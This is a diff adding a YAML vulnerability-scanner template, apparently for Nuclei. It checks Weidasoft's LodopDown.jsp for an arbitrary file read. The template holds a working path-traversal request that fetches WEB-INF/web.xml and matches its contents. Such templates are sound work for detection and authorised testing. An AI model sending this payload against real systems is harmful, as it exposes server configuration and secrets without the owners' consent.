@@ -1,0 +1,29 @@
+id: weidasoft-lodopdown-anyfile-read
+info:
+  name: Weidasoft LodopDown Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/file/LodopDown.jsp?sFile=../../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<param-name>"
+          - "<servlet-name>"
+      - type: word
+        part: header
+        words:
+          - "filename="
+      - type: word
+        part: header
+        words:
+          - "application/x-msdownload"
